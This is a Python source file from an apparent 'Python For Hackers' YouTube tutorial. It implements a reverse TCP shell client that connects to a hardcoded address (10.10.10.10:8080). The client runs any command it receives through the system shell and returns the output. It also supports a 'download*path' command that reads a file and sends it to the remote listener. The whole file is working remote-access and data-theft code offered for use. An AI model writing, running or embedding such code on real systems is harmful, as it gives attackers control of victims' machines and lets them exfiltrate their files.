# Python For Hackers - Priyank Gada
#www.youtube.com/priyankgada
# Reverse TCP Client Side Shell by Priyank Gada
import socket 
import subprocess 
import os   #NEW IMPORT ... FILE OPERATION


# First is the transfer function
# os.path.exists(path) will check the path and if exists then file trasfer will start
# packet=f.read(1024) will transfer 1 KB of file ... LOOP 
# f.close() closes the file
#s.send('DONE') will tell if the file has been sent completely 


def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
# Else Statement : If file not exists . Send : Unable to find out the file .        
    else: 
        s.send('Unable to find out the file')

# Old shell that we had created

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.10.10.10', 8080))
 
    while True: 
        command =  s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            break 


# else if statement , we are creating the custom download command
# download,path = command.split('*') : the command will be splited from the *            
# Example:  download*c:/file.exe

        elif 'download' in command:            
            grab,path = command.split('*')
            
            try:                         
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) )  
                pass


        
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

def main ():
    connect()
main()

#end :) Subscribe to my channel










